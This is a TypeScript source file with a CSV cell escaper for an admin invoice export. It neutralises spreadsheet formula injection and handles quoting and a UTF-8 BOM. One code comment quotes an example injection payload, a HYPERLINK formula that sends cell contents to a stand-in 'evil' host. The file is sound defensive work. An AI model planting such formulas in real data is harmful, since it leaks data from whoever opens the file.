// Shared CSV cell escaper. Single source of truth — previously duplicated
// inline in `/api/admin/invoices/export`. Two safety properties:
//
//   1. Formula injection neutralisation (session 2026-03-20 security audit) —
//      a cell starting with `=`, `+`, `-`, `@`, tab, or carriage-return is
//      prefixed with a single quote so Excel / LibreOffice treat it as a
//      string instead of executing it. Mitigates the case where a malicious
//      client name like `=HYPERLINK("https://evil/?d="&A1)` would auto-fire
//      when an admin opens the export.
//
//   2. RFC 4180 quoting — values containing `;` (our separator), `"`, or
//      `\n` are wrapped in double quotes with embedded quotes doubled. We
//      use `;` as separator (not `,`) so French Excel ("Données → Convertir")
//      opens the export without an import dialog.
//
// Usage:
//   const row = [escapeCsv(invoice.number), escapeCsv(client.email)].join(';');

export function escapeCsv(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';
  const str = String(value);
  const sanitized = /^[=+\-@\t\r]/.test(str) ? `'${str}` : str;
  if (sanitized.includes(';') || sanitized.includes('"') || sanitized.includes('\n')) {
    return `"${sanitized.replace(/"/g, '""')}"`;
  }
  return sanitized;
}

// UTF-8 BOM prepended to CSV bodies so Excel on Windows opens accented
// characters correctly. Without it, "Pension Hébergement" becomes "Pension
// HÃ©bergement" in Excel.
export const UTF8_BOM = '﻿';
